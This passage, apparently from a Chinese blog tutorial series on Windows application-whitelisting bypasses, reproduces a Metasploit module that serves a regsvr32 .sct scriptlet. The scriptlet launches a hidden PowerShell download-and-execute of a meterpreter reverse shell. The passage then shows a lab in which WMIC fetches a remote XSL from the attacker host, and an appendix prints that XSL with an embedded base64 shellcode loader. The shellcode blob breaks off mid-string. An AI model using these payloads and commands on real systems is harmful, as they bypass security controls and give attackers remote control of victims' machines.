include Msf<span class="token punctuation">:</span><span class="token punctuation">:</span>Exploit<span class="token punctuation">:</span><span class="token punctuation">:</span>Remote<span class="token punctuation">:</span><span class="token punctuation">:</span>HttpServer 

def <span class="token function">initialize</span><span class="token punctuation">(</span>info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token function">super</span><span class="token punctuation">(</span><span class="token function">update_info</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span>
<span class="token string">'Name'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'Regsvr32.exe (.sct) Application Whitelisting Bypass Serve r'</span><span class="token punctuation">,</span> <span class="token string">'Description'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token operator">%</span><span class="token function">q</span><span class="token punctuation">(</span>
This module simplifies the Regsvr32<span class="token punctuation">.</span>exe Application Whitelisting Bypass technique<span class="token punctuation">.</span>
The module creates a web server that hosts an <span class="token punctuation">.</span>sct file<span class="token punctuation">.</span> When the user types the provided regsvr32 command on a system<span class="token punctuation">,</span> regsvr32 will request the <span class="token punctuation">.</span>sct file and then execute the included PowerShell command<span class="token punctuation">.</span>
This command then downloads and executes the specified payload <span class="token punctuation">(</span>similar to the web_delivery module with PSH<span class="token punctuation">)</span><span class="token punctuation">.</span>
Both web requests <span class="token punctuation">(</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span><span class="token punctuation">,</span> the <span class="token punctuation">.</span>sct file and PowerShell download and execute<span class="token punctuation">)</span> can occur on the same port<span class="token punctuation">.</span>
<span class="token punctuation">)</span><span class="token punctuation">,</span>

<span class="token string">'License'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> MSF_LICENSE<span class="token punctuation">,</span>
<span class="token string">'Author'</span> <span class="token operator">=</span><span class="token operator">&gt;</span>
<span class="token punctuation">[</span>
<span class="token string">'Casey Smith'</span><span class="token punctuation">,</span> # AppLocker bypass research and vulnerability discover <span class="token function">y</span><span class="token punctuation">(</span>\@subTee<span class="token punctuation">)</span>
<span class="token string">'Trenton Ivey'</span><span class="token punctuation">,</span> # MSF Module <span class="token punctuation">(</span>kn0<span class="token punctuation">)</span>
<span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'DefaultOptions'</span> <span class="token operator">=</span><span class="token operator">&gt;</span>
<span class="token punctuation">{</span>
<span class="token string">'Payload'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'windows/meterpreter/reverse_tcp'</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token string">'Targets'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'PSH'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'Platform'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token operator">%</span><span class="token function">w</span><span class="token punctuation">(</span>win<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token string">'Arch'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span>ARCH_X86<span class="token punctuation">,</span> ARCH_X86_64<span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token string">'DefaultTarget'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span>
<span class="token string">'DisclosureDate'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'Apr 19 2016'</span><span class="token punctuation">,</span>
<span class="token string">'References'</span> <span class="token operator">=</span><span class="token operator">&gt;</span>
<span class="token punctuation">[</span>
<span class="token punctuation">[</span><span class="token string">'URL'</span><span class="token punctuation">,</span> <span class="token string">'http://subt0x10.blogspot.com/2016/04/bypass‐application‐whitelisting‐script.html'</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
end 

def primer
<span class="token function">print_status</span><span class="token punctuation">(</span><span class="token string">'Run the following command on the target machine:'</span><span class="token punctuation">)</span>
<span class="token function">print_line</span><span class="token punctuation">(</span><span class="token string">"regsvr32 /s /n /u /i:\#{get_uri}.sct scrobj.dll"</span><span class="token punctuation">)</span>
end 

def <span class="token function">on_request_uri</span><span class="token punctuation">(</span>cli<span class="token punctuation">,</span> _request<span class="token punctuation">)</span>
<span class="token macro property"># If the resource request ends with '.sct', serve the .sct file</span>
<span class="token macro property"># Otherwise, serve the PowerShell payload</span>
<span class="token keyword">if</span> _request<span class="token punctuation">.</span>raw_uri <span class="token operator">=</span><span class="token operator">~</span> <span class="token operator">/</span>\<span class="token punctuation">.</span>sct$<span class="token operator">/</span>
serve_sct_file
<span class="token keyword">else</span>
serve_psh_payload
end
end 

def serve_sct_file
<span class="token function">print_status</span><span class="token punctuation">(</span><span class="token string">"Handling request for the .sct file from #{cli.peerhost}"</span><span class="token punctuation">)</span>
ignore_cert <span class="token operator">=</span> Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Powershell<span class="token punctuation">:</span><span class="token punctuation">:</span>PshMethods<span class="token punctuation">.</span>ignore_ssl_certificate <span class="token keyword">if</span> ssl
download_string <span class="token operator">=</span> Rex<span class="token punctuation">:</span><span class="token punctuation">:</span>Powershell<span class="token punctuation">:</span><span class="token punctuation">:</span>PshMethods<span class="token punctuation">.</span><span class="token function">proxy_aware_download_and_exec_string</span><span class="token punctuation">(</span>get_uri<span class="token punctuation">)</span>
download_and_run <span class="token operator">=</span> <span class="token string">"#{ignore_cert}#{download_string}"</span>
psh_command <span class="token operator">=</span> <span class="token function">generate_psh_command_line</span><span class="token punctuation">(</span>
noprofile<span class="token punctuation">:</span> true<span class="token punctuation">,</span>
windowstyle<span class="token punctuation">:</span> <span class="token string">'hidden'</span><span class="token punctuation">,</span>
command<span class="token punctuation">:</span> download_and_run
<span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token function">gen_sct_file</span><span class="token punctuation">(</span>psh_command<span class="token punctuation">)</span>
<span class="token function">send_response</span><span class="token punctuation">(</span>cli<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token string">'Content‐Type'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span>
end 

def serve_psh_payload
<span class="token function">print_status</span><span class="token punctuation">(</span><span class="token string">"Delivering payload to #{cli.peerhost}"</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token function">cmd_psh_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encoded<span class="token punctuation">,</span>
payload_instance<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>first<span class="token punctuation">,</span>
remove_comspec<span class="token punctuation">:</span> true<span class="token punctuation">,</span>
use_single_quotes<span class="token punctuation">:</span> true
<span class="token punctuation">)</span>
<span class="token function">send_response</span><span class="token punctuation">(</span>cli<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token string">'Content‐Type'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'application/octet‐stream'</span><span class="token punctuation">)</span>
end 

def rand_class_id
<span class="token string">"#{Rex::Text.rand_text_hex 8}‐#{Rex::Text.rand_text_hex 4}‐#{Rex::Text.rand_text_hex 4}‐#{Rex::Text.rand_text_hex 4}‐#{Rex::Text.rand_text_hex12}"</span>
end 

def <span class="token function">gen_sct_file</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>
<span class="token operator">%</span><span class="token punctuation">{</span><span class="token operator">&lt;</span><span class="token operator">?</span>XML version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>scriptlet<span class="token operator">&gt;</span><span class="token operator">&lt;</span>registrationprogid<span class="token operator">=</span><span class="token string">"\#{rand_text_a lphanumeric 8}"</span>
classid<span class="token operator">=</span><span class="token string">"{#{rand_class_id}}"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span> var r <span class="token operator">=</span> ne <span class="token function">wActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WScript.Shell"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"#{command}"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>registration<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>scriptlet<span class="token operator">&gt;</span><span class="token punctuation">}</span>
end 

end
</code></pre>
<p>使用方法：</p>
<pre><code class="prism language-c">copy regsvr32_applocker_bypass_server<span class="token punctuation">.</span>rb to <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>exploits<span class="token operator">/</span>windows<span class="token operator">/</span>misc
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010160451511.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="1110_%09Wmicpayload_1453"></a>11.10 	基于白名单Wmic执行payload（十）</h2>
<p><strong>Wmic简介：</strong></p>
<p>WMIC扩展WMI（Windows Management Instrumentation，Windows管理工具），提供了从命令行接口和批命令脚本执行系统管理的支持。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的。WMIC改变了这种情况。</p>
<p>说明：Wmic.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Wmic调用。</p>
<p>Windows 2003 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\WINDOWS\system32\wbem\wmic<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\WINDOWS\SysWOW64\wbem\wmic<span class="token punctuation">.</span>exe
</code></pre>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\wbem\WMIC<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\wbem\WMIC<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：<br>
192.168.1.4 Debian</p>
<p>靶机：<br>
192.168.1.119 Windows 2003<br>
192.168.1.5 Windows 7</p>
<p><strong>配置攻击机msf：</strong></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> proce ss<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port 

Exploit target<span class="token punctuation">:</span> 

Id Name

‐‐ ‐‐‐‐

<span class="token number">0</span> Wildcard Target <span class="token number">23</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010160634279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong><br>
Windows 7：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\SysWOW64\wbem\WMIC<span class="token punctuation">.</span>exe os get
<span class="token operator">/</span>format<span class="token punctuation">:</span><span class="token string">"http://192.168.1.4/Micropoor.xsl"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010160704609.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010160710905.png#pic_center" alt="在这里插入图片描述"><br>
Windows 2003：<br>
<img src="https://img-blog.csdnimg.cn/20201010160722182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010160727888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">WMIC<span class="token punctuation">.</span>exe os get <span class="token operator">/</span>format<span class="token punctuation">:</span><span class="token string">"http://192.168.1.4/Micropoor_2003.xsl"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010160743318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>附录：</strong><br>
Micropoor_Win7.xsl：</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">'1.0'</span><span class="token operator">?</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>stylesheet

xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/XSL/Transform"</span> xmlns<span class="token punctuation">:</span>ms<span class="token operator">=</span><span class="token string">"urn:schemas‐microsoft‐com:xslt"</span>

xmlns<span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token string">"placeholder"</span>

version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>output method<span class="token operator">=</span><span class="token string">"text"</span><span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>ms<span class="token punctuation">:</span>script implements‐prefix<span class="token operator">=</span><span class="token string">"user"</span> language<span class="token operator">=</span><span class="token string">"JScript"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span> 

function <span class="token function">setversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

<span class="token punctuation">}</span>

function <span class="token function">debug</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

function <span class="token function">base64ToStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>

var enc <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.Text.ASCIIEncoding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

var length <span class="token operator">=</span> enc<span class="token punctuation">.</span><span class="token function">GetByteCount_2</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

var ba <span class="token operator">=</span> enc<span class="token punctuation">.</span><span class="token function">GetBytes_4</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

var transform <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.Security.Cryptography.FromBase64Transform"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

ba <span class="token operator">=</span> transform<span class="token punctuation">.</span><span class="token function">TransformFinalBlock</span><span class="token punctuation">(</span>ba<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>

var ms <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.IO.MemoryStream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

ms<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>ba<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>length <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

ms<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">return</span> ms<span class="token punctuation">;</span>

<span class="token punctuation">}</span> 

var serialized_obj <span class="token operator">=</span> <span class="token string">"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"</span><span class="token operator">+</span>
<span class="token string">"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"</span><span class="token operator">+</span>
<span class="token string">"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"</span><span class="token operator">+</span>
<span class="token string">"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"</span><span class="token operator">+</span>
<span class="token string">"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"</span><span class="token operator">+</span>
<span class="token string">"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"</span><span class="token operator">+</span>
<span class="token string">"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"</span><span class="token operator">+</span>
<span class="token string">"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"</span><span class="token operator">+</span>
<span class="token string">"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"</span><span class="token operator">+</span>
<span class="token string">"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"</span><span class="token operator">+</span>
<span class="token string">"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"</span><span class="token operator">+</span>
<span class="token string">"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"</span><span class="token operator">+</span>
<span class="token string">"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"</span><span class="token operator">+</span>
<span class="token string">"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"</span><span class="token operator">+</span>
<span class="token string">"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"</span><span class="token operator">+</span>
<span class="token string">"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"</span><span class="token operator">+</span>
<span class="token string">"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"</span><span class="token operator">+</span>
<span class="token string">"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"</span><span class="token operator">+</span>
<span class="token string">"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"</span><span class="token operator">+</span>
<span class="token string">"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"</span><span class="token operator">+</span>
<span class="token string">"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"</span><span class="token operator">+</span>
<span class="token string">"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"</span><span class="token operator">+</span>
<span class="token string">"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAVC1CXAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAA4AACIQsBCwAADAAAAAYAAAAAAAAOKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAwCkA"</span><span class="token operator">+</span>
<span class="token string">"AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAALnRleHQAAAAUCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA"</span><span class="token operator">+</span>
<span class="token string">"AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPApAAAAAAAASAAAAAIABQBEIgAAfAcAAAMAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA"</span><span class="token operator">+</span>
<span class="token string">"KAIAAAYAACoAAAAAAAAA/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH"</span><span class="token operator">+</span>
<span class="token string">"4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiL"</span><span class="token operator">+</span>
<span class="token string">"WCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/"</span><span class="token operator">+</span>
<span class="token string">"0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/"</span><span class="token operator">+</span>
<span class="token string">"1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBW"</span><span class="token operator">+</span>
<span class="token string">"U1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMp"</span><span class="token operator">+</span>
<span class="token string">"xnXBw7vwtaJWagBT/9UAAAATMAYAZQAAAAEAABEAIFUBAACNBgAAASXQAwAABCgGAAAKChYGjml+"</span><span class="token operator">+</span>
<span class="token string">"AQAABH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMo"</span><span class="token operator">+</span>
<span class="token string">"BAAABgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4z"</span><span class="token operator">+</span>
<span class="token string">"MDMxOQAAAAAFAGwAAABgAgAAI34AAMwCAABkAwAAI1N0cmluZ3MAAAAAMAYAAAgAAAAjVVMAOAYA"</span><span class="token operator">+</span>
<span class="token string">"ABAAAAAjR1VJRAAAAEgGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAA"</span><span class="token operator">+</span>
<span class="token string">"DwAAAAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAAB"</span><span class="token operator">+</span>
<span class="token string">"AAAAAQAAAAAACgABAAAAAAAGAEsARAAGAFsBPwEGAHcBPwEGAKYBhgEGAMYBhgEGAPcBRAAGAEEC"</span><span class="token operator">+</span>
<span class="token string">"hgEGAFwCRAAGAJgChgEGAKcCRAAGAK0CRAAGANACRAAGAAID4wIGABQD4wIGAEcDNwMAAAAAAQAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAQABAAEAEAAhACkABQABAAEAAAAAAPwBAAAFAAMABwATAQAAZgIAACEABAAHABEAXQASABEA"</span><span class="token operator">+</span>
<span class="token string">"aAASABMBhAI+AFAgAAAAAIYYUgAKAAEAwCEAAAAAkQBYAA4AAQAAAAAAgACRIH8AFQABAAAAAACA"</span><span class="token operator">+</span>
<span class="token string">"AJEgjAAdAAUAAAAAAIAAkSCZACgACwAxIgAAAACRGDADDgANAAAAAQCtAAAAAgC5AAAAAwC+AAAA"</span><span class="token operator">+</span>
<span class="token string">"BADPAAAAAQDZAAAAAgDsAAAAAwD4AAAABAAHAQAABQANAQAABgAdAQAAAQAoAQAAAgAwAREAUgAu"</span><span class="token operator">+</span>
<span class="token string">"ACEAUgA0ACkAUgAKAAkAUgAKADkAUgAKAEkAwAJCAGEA1wJKAGkACgNPAGEADwNYAHEAUgBkAHkA"</span><span class="token operator">+</span>
<span class="token string">"UgAKACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEAVQEAAAQAWwAnAwABBwB/AAEAAAEJ"</span><span class="token operator">+</span>
<span class="token string">"AIwAAQAAAQsAmQABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAAOQBAAAEAAAAAAAAAAAAAAABADsA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAQAAwAAAAA8TW9kdWxlPgB3bWlfY3NfZGxsX3BheWxvYWQuZGxsAFByb2dyYW0AU2hlbGxD"</span><span class="token operator">+</span>
<span class="token string">"b2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgBNYWluAE1FTV9DT01NSVQA"</span><span class="token operator">+</span>
<span class="token string">"UEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3JlYXRlVGhyZWFkAFdhaXRGb3JT"</span><span class="token operator">+</span>
<span class="token string">"aW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABs"</span><span class="token operator">+</span>
<span class="token string">"cFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAcGFyYW0AZHdDcmVh"</span><span class="token operator">+</span>
<span class="token string">"dGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uU2VjdXJp"</span><span class="token operator">+</span>
<span class="token string">"dHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAFNlY3VyaXR5QWN0aW9u"</span><span class="token operator">+</span>
<span class="token string">"AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0"</span><span class="token operator">+</span>
<span class="token string">"dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB3bWlfY3NfZGxsX3BheWxvYWQA"</span><span class="token operator">+</span>
